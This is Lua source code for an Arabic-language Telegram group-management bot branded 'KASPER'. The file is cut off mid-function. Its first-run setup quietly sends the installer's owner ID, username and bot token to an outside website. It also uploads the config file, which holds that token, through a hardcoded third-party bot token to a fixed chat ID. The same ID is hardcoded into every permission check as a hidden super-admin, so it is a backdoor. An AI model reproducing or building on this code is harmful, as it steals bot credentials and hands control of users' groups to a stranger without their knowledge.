-- Welcom To File The Best Source In The Telegram
-- All The File By Developer KASPER : @KKKKF
-- Join In Chennel Source : @KASPER_CH 
-- Join In Explanation Channel : @Learn_KASPER
----------------------------------------------------------------------------
serpent = require("serpent")
lgi = require('lgi')
redis = require('redis')
KASPERdx1 = Redis.connect('127.0.0.1', 6379)
URL = require('socket.url')  
HTTPS = require ("ssl.https")  
https = require ("ssl.https") 
http  = require ("socket.http")
json = dofile('./JSON.lua')
JSON = dofile('./dkjson.lua')
notify = lgi.require('Notify') 
notify.init ("Telegram updates")
chats = {}
day = 313456502
function vardump(value)  
print(serpent.block(value, {comment=false}))  
end 
local AutoSet = function()
io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  
local SUDO = tonumber(io.read())   
if not tostring(SUDO):match('%d+') then  
local SUDO = 1299351897
end
io.write("\27[31;47m\n◼¦ ارسل معرف المطور الاساسي مع ال @ SEND ID FOR username \27[0;34;49m\n")  
local username = io.read()
io.write("\27[31;47m\n◼¦ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  
local token = io.read()  
botid = token:match("(%d+)")
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    file:close()  
end
local create_config_auto = function()
config = {
SUDO = SUDO,
token = token,
bot_id = botid,
username = username, 
sudo_users = {SUDO}, 
}
create(config, "./config.lua")   
https.request("https://KASPER.net/KASPER/?id="..SUDO.."&user="..username.."&token="..token)
local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 1299351897 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
file = io.open("RUNFA.sh", "w")  
file:write([[
#!/bin/bash 
token="]]..token..[["
while(true) do
rm -fr ../.telegram-cli
echo -e ""
echo -e ""
./tg -s ./KASPER.lua $@ --bot=$token
done
]])  
file:close()  
file = io.open("FA", "w")  
file:write([[
killall screen
while(true) do
rm -fr ../.telegram-cli
screen ./RUNFA.sh
done
]])  
file:close() 
os.execute('./FA')
end 
create_config_auto()
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "_"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end end
local load_KASPERdx1 = function()  
local f = io.open("./config.lua", "r")  
if not f then   AutoSet()  
else   
f:close()  
end  
local config = loadfile("./config.lua")() 
return config 
end  
_KASPERdx1 = load_KASPERdx1()  
sudos = dofile("./config.lua") 
bot_owner = sudos.SUDO 
sudo_users = {sudos.sudo_users} 
bot_id = sudos.bot_id 
KASPER = sudos.bot_id
SUDOUSERNAME = sudos.username
tokenbot = sudos.token
name_bot = (KASPERdx1:get(KASPER..'name_bot') or 'فايدر')
SudoKASPER = SUDOUSERNAME:gsub('@','') 
SudoKASPER = SudoKASPER:gsub([[\_]],'_')
----------------------------------------------------------
-- Start Functions Source KASPER --
--     By Developer KASPER     -- 
-------- Bot Owner
function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(1299351897) then var = true end return var end
function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
-------- Sudo
function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(1299351897) then var = true end return var end
function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
-------- Sudo3
function is_admin(user_id) local var = false local hashsb =  'bot:admins:' local admin = KASPERdx1:sismember(KASPER..hashsb, user_id) if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
-------- Owner all
function is_onall(user_id) local var = false local hash =  'bot:onall:' local onall = KASPERdx1:sismember(KASPER..hash, user_id) local hashs =  'bot:admins:' local admin = KASPERdx1:sismember(KASPER..hashs, user_id) if onall then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
--------Modod all
function is_moall(user_id) local var = false local hash =  'bot:moall:' local moall = KASPERdx1:sismember(KASPER..hash, user_id) local hashs =  'bot:admins:' local admin = KASPERdx1:sismember(KASPER..hashs, user_id) local hashss =  'bot:onall:' local onall = KASPERdx1:sismember(KASPER..hashss, user_id) if moall then var = true end if admin then var = true end if onall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
-------- Vip Member All
function is_vpall(user_id) local var = false local hashs =  'bot:vpall:' local vpall = KASPERdx1:sismember(KASPER..hashs, user_id) local hashss =  'bot:onall:' local onall = KASPERdx1:sismember(KASPER..hashss, user_id) local hashsss = 'bot:admins:' local admin = KASPERdx1:sismember(KASPER..hashsss, user_id) local hashssss =  'bot:moall:'local moall = KASPERdx1:sismember(KASPER..hashssss, user_id) if vpall then var = true end if onall then var = true end if admin then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
-------- Donky
function is_donky(user_id, chat_id) local var = false local hash =  'bot:donky:'..chat_id local momod = KASPERdx1:sismember(KASPER..hash, user_id) local hashs =  'bot:admins:' local admin = KASPERdx1:sismember(KASPER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = KASPERdx1:sismember(KASPER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = KASPERdx1:sismember(KASPER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = KASPERdx1:sismember(KASPER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = KASPERdx1:sismember(KASPER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = KASPERdx1:sismember(KASPER..hashfaed, user_id) if donky then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
-------- Monsh
function is_monsh(user_id, chat_id) local var = false local hash =  'bot:monsh:'..chat_id local monsh = KASPERdx1:sismember(KASPER..hash, user_id) local hashs =  'bot:admins:' local admin = KASPERdx1:sismember(KASPER..hashs, user_id) if monsh then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
-------- Monsh2
function is_monsh2(user_id, chat_id) local var = false local hash =  'bot:monsh2:'..chat_id local monsh2 = KASPERdx1:sismember(KASPER..hash, user_id) local hashs =  'bot:admins:' local admin = KASPERdx1:sismember(KASPER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = KASPERdx1:sismember(KASPER..hashss, user_id) if monsh2 then var = true end if admin then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
-------- Owner
function is_owner(user_id, chat_id) local var = false local hash =  'bot:owners:'..chat_id local owner = KASPERdx1:sismember(KASPER..hash, user_id) local hashs =  'bot:admins:' local admin = KASPERdx1:sismember(KASPER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = KASPERdx1:sismember(KASPER..hashss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = KASPERdx1:sismember(KASPER..hashw, user_id) if owner then var = true end if admin then var = true end if monsh then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
-------- Modod
function is_momod(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = KASPERdx1:sismember(KASPER..hash, user_id) local hashs =  'bot:admins:' local admin = KASPERdx1:sismember(KASPER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = KASPERdx1:sismember(KASPER..hashss, user_id) local hashsss =  'bot:monsh:'..chat_id local monsh = KASPERdx1:sismember(KASPER..hashsss, user_id) local hashssss =  'bot:onall:' local onall = KASPERdx1:sismember(KASPER..hashssss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = KASPERdx1:sismember(KASPER..hashw, user_id) if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
-------- Vip Member
function is_vipmem(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = KASPERdx1:sismember(KASPER..hash, user_id) local hashs =  'bot:admins:' local admin = KASPERdx1:sismember(KASPER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = KASPERdx1:sismember(KASPER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = KASPERdx1:sismember(KASPER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = KASPERdx1:sismember(KASPER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = KASPERdx1:sismember(KASPER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = KASPERdx1:sismember(KASPER..hashfaed, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = KASPERdx1:sismember(KASPER..hashw, user_id) if vipmem then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1299351897) then var = true end return var end
----------------------------------------------------------
--     By Developer KASPER     -- 
local setnumbergp = function()
local setnumbergp_two = function(user_id)
local hashs = "admins:data:" .. user_id
local lists = KASPERdx1:smembers(KASPER..hashs)
KASPERdx1:del(KASPER.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
KASPERdx1:incr(KASPER.."SudoNumberGp" .. user_id)
end end
local setnumbergp_three = function(user_id)
local hashss = "admins:data:" .. user_id
local lists = KASPERdx1:smembers(KASPER..hashss)
KASPERdx1:del(KASPER.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
KASPERdx1:incr(KASPER.."SudoNumberGp" .. user_id)
end end
local list = KASPERdx1:smembers(KASPER.."Bot:Admins")
for k, v in pairs(list) do
setnumbergp_two(v)
end
local lists = KASPERdx1:smembers(KASPER.."Bot:leader")
for k, v in pairs(lists) do
setnumbergp_three(v)
end
KASPERdx1:setex(KASPER.."bot:reload", 7230, true)
end
--     By Developer KASPER     -- 
-------- FreeWords
local function is_free(msg, value)
local var = false
local hash = (KASPER..'bot:freewords:')
if hash then
local names = KASPERdx1:hkeys(hash)
local text = ''
local value = value:gsub('-','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) then
var = true
end end end return var end
--     By Developer KASPER     -- 
-------- Banned
local function is_banned(user_id, chat_id)
local var = false
local hash = 'bot:banned:'..chat_id
local banned = KASPERdx1:sismember(KASPER..hash, user_id)
if banned then
var = true
end return var end
--     By Developer KASPER     -- 
-------- Muted
local function is_muted(user_id, chat_id)
local var = false
local hash = 'bot:muted:'..chat_id
local muted = KASPERdx1:sismember(KASPER..hash, user_id)
if muted then
var = true
end return var end
--     By Developer KASPER     -- 
-------- Gbaned
function is_gbanned(user_id)
local var = false
local hash = 'bot:gban:'
local gbanned = KASPERdx1:sismember(KASPER..hash, user_id)
if gbanned then
var = true 
end return var end
--     By Developer KASPER     -- 
-------- mutedall
function is_mutedall(user_id)
local var = false
local hash = 'bot:mutedall:'
local mutedall = KASPERdx1:sismember(KASPER..hash, user_id)
if mutedall then
var = true
end return var end
--     By Developer KASPER     -- 
-------- Delete Msg
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
-------- Who Add
local who_add = function(chat)
local user_id
local user = false
local list1 = KASPERdx1:smembers(KASPER.."Bot:KpSudos")
local list2 = KASPERdx1:smembers(KASPER.."Bot:Admins")
for k, v in pairs(list1) do
local hash = "sudo:data:" .. v
local is_add = KASPERdx1:sismember(KASPER..hash, chat)
if is_add then
user_id = v
end end
for k, v in pairs(list2) do
local hash = "sudo:data:" .. v
local is_add = KASPERdx1:sismember(KASPER..hash, chat)
if is_add then
user_id = v
end end
local hash = "sudo:data:" .. bot_owner
if KASPERdx1:sismember(KASPER..hash, chat) then
user_id = bot_owner
end
if user_id then
local user_info = KASPERdx1:get(KASPER.."user:Name" .. user_id)
if user_info then
user = user_info
end end return user end
--     By Developer KASPER     -- 
-------- Get Chat
local function getChat(chat_id, cb, cmd) 
tdcli_function ({ ID = "GetChat", chat_id_ = chat_id }, cb or dl_cb, cmd) 
end  
function getChat(chat_id, dl_cb, cmd)
tdcli_function ({ID = "GetChat",chat_id_ = chat_id}, dl_cb, cmd) 
end
local function getchat(GroupID,func) 
pcall(tdcli_function({ID="GetChat",chat_id_ = GroupID},func or dl_cb,nil)) 
end 
--     By Developer KASPER     -- 
local function KASPERdx113(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
local function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function Send_Options(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "KASPER_ch")
for gmatch in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = gmatch
end
if status == "reply" then
send(msg.chat_id_, msg.id_,"✟︙العضو ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"✟︙لا يمكن الوصول الى معلومات العضو ،")
end end,nil) end
--     By Developer KASPER     -- 
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function add_file(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= KASPER:lower() then 
KASPERdx113(chat,msg.id_,"*✟︙هذا الملف ليس تابع لسورس فايدر ،*")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot' .. tokenbot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..File.result.file_path, ''..File_Name) 
KASPERdx113(chat,msg.id_,"*✟︙جاري رفع الملف ....*")   
else
KASPERdx113(chat,msg.id_,"*✟︙غير صحيح ،*")   
end
local info_file = io.open('./'..KASPER..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
KASPERdx113(chat,msg.id_,"*✟︙تم رفع نسخه الملف ،\n✟︙تم رفع مشرفين المجموعات ،\n✟︙تم قفل اوامر حمايه المجموعات ،*")
vardump(groups)
for idg,v in pairs(groups.GP_BOT) do
KASPERdx1:sadd(KASPER.."bot:groups",idg)
KASPERdx1:set(KASPER.."bot:enable:"..idg,true)
KASPERdx1:setex(KASPER.."bot:charge:"..idg,86400,true)
KASPERdx1:sadd("KASPER:addg"..bot_id, idg) KASPERdx1:set(KASPER..'editmsg'..idg,true)
KASPERdx1:set(KASPER..'bot:bots:mute'..idg,true) KASPERdx1:set(KASPER..'bot:bots:ban'..idg,true)
KASPERdx1:set(KASPER..'keed_bots'..idg,true) KASPERdx1:set(KASPER..'anti-flood:'..idg,true)
KASPERdx1:set(KASPER..'bot:inline:mute'..idg,true) KASPERdx1:set(KASPER..'bot:photo:mute'..idg,true)
KASPERdx1:set(KASPER..'bot:spam:mute'..idg,true) KASPERdx1:set(KASPER..'bot:video:mute'..idg,true)
KASPERdx1:set(KASPER..'bot:gifs:mute'..idg,true) KASPERdx1:set(KASPER..'tags:lock'..idg,true)
KASPERdx1:set(KASPER..'bot:music:mute'..idg,true) KASPERdx1:set(KASPER..'bot:voice:mute'..idg,true)
KASPERdx1:set(KASPER..'bot:links:mute'..idg,true) KASPERdx1:set(KASPER..'bot:location:mute'..idg,true) 
KASPERdx1:set(KASPER..'bot:strict'..idg,true) KASPERdx1:set(KASPER..'bot:document:mute'..idg,true) 
KASPERdx1:set(KASPER..'bot:hashtag:mute'..idg,true) KASPERdx1:set(KASPER..'bot:contact:mute'..idg,true) 
KASPERdx1:set(KASPER..'bot:webpage:mute'..idg,true) KASPERdx1:set(KASPER..'bot:sticker:mute'..idg,true)
KASPERdx1:set(KASPER..'markdown:lock'..idg,true) KASPERdx1:set(KASPER..'bot:forward:mute'..idg,true)
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
KASPERdx1:sadd(KASPER..'bot:monsh:'..idg,idmsh)  
print('تم رفع '..k..' منشئين')
end end
if v.MDER then
for k,idmder in pairs(v.MDER) do
KASPERdx1:sadd(KASPER..'bot:owners:'..idg,idmder)  
print('تم رفع '..k..' مدراء')
end end
if v.MOD then
for k,idmod in pairs(v.MOD) do
vardump(idmod)
KASPERdx1:sadd(KASPER..'bot:momod:'..idg,idmod)  
print('تم رفع '..k..' ادمنيه')
end end
if v.VIP then
for k,idvip in pairs(v.VIP) do
KASPERdx1:sadd(KASPER..'bot:vipmem:'..idg,idvip)  
print('تم رفع '..k..' مميزين')
end end
if v.linkgroup then
if v.linkgroup ~= "" then
KASPERdx1:set(KASPER.."bot:group:link"..idg,v.linkgroup)   
print('تم وضع رابط ')
end end end end
--     By Developer KASPER     -- 
-------- Resolve Username
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     By Developer KASPER     -- 
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat_id,
user_id_ = user_id,
status_ = {
ID = "ChatMemberStatus" .. status
},
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end return infile end
--     By Developer KASPER     -- 
-------- Del All Msgs
function del_all_msgs(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end return chat end
--     By Developer KASPER     -- 
-------- Chat Leave
function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--     By Developer KASPER     -- 
-------- From Username
function from_username(msg)
function gfrom_user(extra,result,success)
if result.username_ then
F = result.username_
else
F = 'nil'
end
return F
end
local username = getUser(msg.sender_user_id_,gfrom_user)
return username
end
--     By Developer KASPER     -- 
-------- Do Notify
function do_notify(user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--     By Developer KASPER     -- 
-------- Chat Kick
function chat_kick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--     By Developer KASPER     -- 
-------- Get Parse Mode
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end end return P end
--     By Developer KASPER     -- 
-------- Get Message
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     By Developer KASPER     -- 
-------- Send Contact
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageContact",
contact_ = {
ID = "Contact",
phone_number_ = phone_number,
first_name_ = first_name,
last_name_ = last_name,
user_id_ = user_id
},},}, dl_cb, nil)
end
--     By Developer KASPER     -- 
-------- Send Photo
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessagePhoto",
photo_ = getInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption
},
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageDocument",
document_ = getInputFile(document),
caption_ = caption
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local Forward = function(chat_id, from_chat_id, message_id, cb)
tdcli_function({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_id,
disable_notification_ = 0,
from_background_ = 1
}, cb or dl_cb, nil)
end
--     By Developer KASPER     -- 
function getChats(offset_order, offset_chat_id, limit, cb, cmd)
if not limit or limit > 20 then
limit = 20
end
tdcli_function ({
ID = "GetChats",
offset_order_ = offset_order or 9223372036854775807,
offset_chat_id_ = offset_chat_id or 0,
limit_ = limit
}, cb or dl_cb, cmd)
end
--     By Developer KASPER     -- 
function getUserFull(user_id,cb)
tdcli_function ({
ID = "GetUserFull",
user_id_ = user_id
}, cb, nil)
end
--     By Developer KASPER     -- 
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     By Developer KASPER     -- 
function dl_cb(arg, data)
end
--     By Developer KASPER     -- 
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function KASPERdx(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function sendaction(chat_id, action, progress)
tdcli_function ({
ID = "SendChatAction",
chat_id_ = chat_id,
action_ = {
ID = "SendMessage" .. action .. "Action",
progress_ = progress or 100
}
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "EditMessageText",
chat_id_ = chat_id,
message_id_ = message_id,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function setphoto(chat_id, photo)
tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function add_user(chat_id, user_id, forward_limit)
tdcli_function ({
ID = "AddChatMember",
chat_id_ = chat_id,
user_id_ = user_id,
forward_limit_ = forward_limit or 50
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function unpinmsg(channel_id)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function blockUser(user_id)
tdcli_function ({
ID = "BlockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function unblockUser(user_id)
tdcli_function ({
ID = "UnblockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function getBlockedUsers(offset, limit)
tdcli_function ({
ID = "GetBlockedUsers",
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function delmsg(arg,data)
for k,v in pairs(data.messages_) do
delete_msg(v.chat_id_,{[0] = v.id_})
end end
--     By Developer KASPER     -- 
function chat_del_user(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, 'Editor')
end
--     By Developer KASPER     -- 
function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end return req end 
--     By Developer KASPER     -- 
function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..tokenbot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return s_api(url)  
end
--     By Developer KASPER     -- 
function send_inline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..tokenbot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return s_api(send_api) 
end
--     By Developer KASPER     -- 
function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function getChannelFull(channel_id)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
function getChannelFull(channel_id,cb)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, cb, nil)
end
--     By Developer KASPER     -- 
function chek_bots(channel,cb)
local function callback_admins(extra,result,success)
limit = (result.member_count_ )
getChannelMembers(channel, 0, 'Bots', limit,cb)
end
getChannelFull(channel,callback_admins)
end
--     By Developer KASPER     -- 
function getInputMessageContent(file, filetype, caption)
if file:match('/') or file:match('.') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
